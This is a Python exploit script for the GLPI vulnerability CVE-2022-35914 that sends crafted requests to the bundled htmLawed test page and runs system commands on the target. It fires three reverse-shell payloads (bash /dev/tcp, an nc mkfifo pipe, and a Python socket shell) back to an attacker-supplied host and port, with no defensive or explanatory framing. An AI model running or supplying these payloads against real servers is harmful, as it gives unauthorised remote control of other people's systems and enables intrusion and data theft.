#!/usr/bin/env python3 

import os
import argparse
import sys
import time
from contextlib import redirect_stdout
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET



print(RED+     " _____ _____  _____    _____  _     ______ _____    _   _______ _      _      ___________ ")
print(YELLOW+  "|  _  |  __ \/  __ \  |  __ \| |    | ___ \_   _|  | | / /_   _| |    | |    |  ___| ___ \\")
print(MAGENTA+ "| | | | |  \/| /  \/  | |  \/| |    | |_/ / | |    | |/ /  | | | |    | |    | |__ | |_/ /")
print(BLUE   + "| | | | | __ | |      | | __ | |    |  __/  | |    |    \  | | | |    | |    |  __||    / ")
print(GREEN  + "\ \_/ / |_\ \| \__/\  | |_\ \| |____| |    _| |_   | |\  \_| |_| |____| |____| |___| |\ \ ")
print(CYAN   + " \___/ \____/ \____/   \____/\_____/\_|    \___/   \_| \_/\___/\_____/\_____/\____/\_| \_|"+RESET)
                                                                                                                                                                             

parser = argparse.ArgumentParser(description="GLPI CVE-2022-35914",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="GLPI CVE-2022-35914", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-p", "--RPORT", action="store", help="RPORT")
parser.add_argument("-P", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
RPORT = args.RPORT
LPORT = args.LPORT
LHOST = args.LHOST
input(f"\n\nStart listener on {LHOST} on port {LPORT} press enter to continue\n"+RESET)
os.system(f'curl -s -d "text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=bash+-c+\'bash+-i+>%26+/dev/tcp/{LHOST}/{LPORT}+0>%261\'" -b sid=bs "http://{RHOST}/vendor/htmlawed/htmlawed/htmLawedTest.php"')
os.system(f'curl -s -d "text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{LHOST}%20{LPORT}%20%3E%2Ftmp%2Ff" -b sid=bs "http://{RHOST}/vendor/htmlawed/htmlawed/htmLawedTest.php"')
os.system(f'curl -s -d "text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=%2Fusr%2Fbin%2Fpython3%20-exec%20%7B%7D%20-c%20import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22{LHOST}%22%2C{LPORT}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%20%3B" -b sid=bs "http://{RHOST}/vendor/htmlawed/htmlawed/htmLawedTest.php"')
print(GREEN+"Hopefully you got your shell")
exit()
